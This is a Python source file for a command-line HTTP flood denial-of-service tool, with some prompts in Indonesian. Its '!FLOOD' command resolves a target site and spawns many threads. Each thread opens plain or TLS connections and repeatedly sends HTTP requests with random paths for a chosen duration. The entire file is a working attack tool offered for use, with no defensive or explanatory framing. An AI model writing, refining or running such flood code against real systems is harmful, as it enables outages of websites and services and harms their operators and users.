import socket
import ssl
import threading
import string
import random
import time
import os
import platform
import sys
from colorama import Fore

stop_attack = threading.Event()

def clear_text():
    os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')

def generate_path(num):
    return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=int(num)))

def DoS_Attack(ip, host, port, method, booter_sent, packet_type, is_https):
    if stop_attack.is_set(): return
    path = generate_path(5)
    try:
        s = socket.create_connection((ip, port))
        if is_https:
            context = ssl.create_default_context()
            s = context.wrap_socket(s, server_hostname=host)

        if packet_type == 'PYF':
            packet = f"{method} /{path} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()
        else:
            packet = f"{method} /{path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n".encode()

        for _ in range(booter_sent):
            if stop_attack.is_set(): break
            s.sendall(packet)
    except:
        pass
    finally:
        try:
            s.close()
        except:
            pass

def run_attack(ip, host, port, end_time, spam, method, booter_sent, packet_type, is_https):
    while time.time() < end_time and not stop_attack.is_set():
        for _ in range(min(spam, 20)):
            if stop_attack.is_set(): break
            t = threading.Thread(target=DoS_Attack, args=(ip, host, port, method, booter_sent, packet_type, is_https))
            t.daemon = True
            t.start()
        time.sleep(0.01)

def countdown_timer(end_time):
    while not stop_attack.is_set():
        remaining = int(end_time - time.time())
        if remaining <= 0:
            print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
            stop_attack.set()
            break
        sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
        sys.stdout.flush()
        time.sleep(1)

def stop_attack_thread():
    input()
    stop_attack.set()
    print(f"\n{Fore.YELLOW}Serangan Dihentikan{Fore.RESET}")

def confirm_exit():
    while True:
        sys.stdout.write(f"\r{Fore.YELLOW}Mau keluar? (y/n): {Fore.RESET}")
        sys.stdout.flush()
        choice = input().lower()
        if choice == 'y':
            print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
            sys.exit(0)
        elif choice == 'n':
            print()
            return

def command():
    global stop_attack
    while True:
        try:
            data = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
            if not data:
                confirm_exit()
                continue
            args = data.split(" ")
            if args[0].lower() == "clear":
                clear_text()
            elif args[0].upper() == "!FLOOD":
                if len(args) == 10:
                    packet_type = args[1].upper()
                    target = args[2]
                    port = int(args[3])
                    duration = int(args[4])
                    spam = int(args[5])
                    threads = min(int(args[6]), 10)
                    booter_sent = int(args[7])
                    method = args[8]
                    spam_create = min(int(args[9]), 10)

                    host = target.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0]
                    is_https = target.startswith("https://")

                    try:
                        ip = socket.gethostbyname(host)
                    except socket.gaierror:
                        print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
                        continue

                    stop_attack.clear()
                    end_time = time.time() + duration

                    print(f"{Fore.LIGHTCYAN_EX}Serangan dimulai\n{Fore.YELLOW}Target: {target}\nPort: {port}\nType: {packet_type}\n{Fore.RESET}")

                    for _ in range(threads):
                        for _ in range(spam_create):
                            t = threading.Thread(target=run_attack, args=(ip, host, port, end_time, spam, method, booter_sent, packet_type, is_https))
                            t.start()

                    threading.Thread(target=countdown_timer, args=(end_time,), daemon=True).start()
                    threading.Thread(target=stop_attack_thread, daemon=True).start()

                    while not stop_attack.is_set() and time.time() < end_time:
                        time.sleep(0.1)

                    stop_attack.set()
                    print()
                    continue
                else:
                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> <SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> <HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
            else:
                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Program terminated by user (Ctrl+C). Exiting...{Fore.RESET}")
            stop_attack.set()
            sys.exit(0)

if __name__ == "__main__":
    try:
        command()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Program terminated by user (Ctrl+C). Exiting...{Fore.RESET}")
        stop_attack.set()
        sys.exit(0)
